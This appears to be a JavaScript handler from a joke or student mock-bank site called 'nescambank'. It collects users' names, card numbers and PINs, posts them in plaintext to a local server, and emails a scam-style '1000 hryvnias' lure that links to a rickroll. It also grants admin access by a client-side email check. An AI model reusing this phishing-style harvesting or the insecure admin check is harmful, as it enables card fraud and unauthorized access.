document.getElementById("user-form").addEventListener("submit", async (event) => {
    event.preventDefault();

    const email = document.getElementById("email").value;
    const name = document.getElementById("name").value;
    const fathername = document.getElementById("fathername").value;
    const surname = document.getElementById("surname").value;
    const cardNumber = document.getElementById("cardNumber").value;
    const password = document.getElementById("pin").value;
    

    if (!notEmptyString(email) || !notEmptyString(name) || !notEmptyString(fathername) || !notEmptyString(surname) || !notEmptyString(password))  {
        alert("Всі поля обов'язкові!");
        return;
    }

    if (email === "nescambank@gmail.com") {   //redirect to admin page
        window.location.href = "/admin";}

    else {
        const newEntry = {
        email,
        user: { name, fathername, surname },
        cardNumber,
        password
        };

        alert("Підтвердіть реєстрацію через пошту!")

        //send to bd
        try {
            const response = await fetch("http://localhost:3000/secure-data", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(newEntry)
            });

            if (!response.ok) throw new Error("Failed to add new user");

            console.log("User added successfully");

            //send rickroll
            await fetch("http://localhost:3000/emails/send-emails", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ text: 'Дякуємо за реєстрацію! Натисніть тут, щоб отримати 1000 гривень --> https://r.mtdv.me/neskambank',
                addressList: [{ email: newEntry.email, user: newEntry.user }] })
            });

            event.target.reset();
        } catch (error) {
            console.log("Error:", error);
        }}
    
});

function notEmptyString(str) {
    return str && typeof str === "string" && str.trim() !== "";
}

 